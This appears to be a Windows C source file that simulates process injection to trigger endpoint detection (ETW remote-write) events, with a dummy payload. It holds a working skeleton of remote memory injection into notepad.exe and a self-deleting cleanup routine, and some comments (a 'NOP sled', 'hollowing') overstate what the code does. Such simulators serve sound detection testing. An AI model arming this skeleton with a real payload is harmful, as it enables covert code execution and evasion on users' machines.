#include <windows.h>
#include <stdio.h>

#define TARGET_PROC_LPCSTR "notepad.exe"  // const char* for CreateProcessA(LPCSTR)
#define PAYLOAD_SIZE 1024

BYTE dummy_payload[PAYLOAD_SIZE] = {0x90};  // NOP sled + harmless loop

void cleanup() {
    Sleep(2000); char self[260]; GetModuleFileNameA(NULL, self, 260); DeleteFileA(self); ExitProcess(0);
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE h2, LPSTR lp, int n) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi;
    CreateProcessA(NULL, (LPSTR)TARGET_PROC_LPCSTR, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // Hollowing simulation: Write to remote process (triggers ETW WRITEVM_REMOTE)
    LPVOID base = VirtualAllocEx(pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, base, dummy_payload, PAYLOAD_SIZE, NULL);
    
    // Resume (harmless payload does nothing)
    ResumeThread(pi.hThread);
    Sleep(1000); TerminateProcess(pi.hProcess, 0);
    
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    cleanup();
    return 0;
}